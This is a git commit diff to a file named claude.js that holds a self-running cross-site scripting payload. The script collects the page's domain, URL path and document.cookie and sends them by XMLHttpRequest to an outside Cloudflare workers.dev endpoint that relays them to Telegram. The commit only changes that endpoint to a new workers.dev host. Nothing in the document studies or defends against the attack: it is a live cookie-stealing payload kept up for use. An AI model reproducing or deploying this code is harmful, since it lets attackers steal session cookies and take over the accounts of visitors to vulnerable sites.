20cb88beaba1f2bfde7403ee6d478173a244e8fa
inggarfi <inggarsaput@gmail.com>
2025-04-03 15:54:12 +0700

    Update claude.js

--- claude.js
+++ claude.js
@@ -2,7 +2,7 @@ function telegramSend() {
     var textData = '<b>XSS+Alert+in+' + document.domain + '</b>%0d%0a------------------------------------------------%0d%0a%0d%0a<b>-+URL+Target+-</b>%0d%0a<pre>' + document.location.hostname + document.location.pathname + '</pre>%0d%0a%0d%0a<b>-+Document+Cookie+-</b>%0d%0a<pre>' + document.cookie + '</pre>';
     
     var xhr = new XMLHttpRequest();
-    xhr.open('GET', 'https://telegram-worker.inggarsaput.workers.dev/?message=' + textData, true);
+    xhr.open('GET', 'https://memek-worker.defoy89122.workers.dev/?message=' + textData, true);
     xhr.send();
 }
 telegramSend();
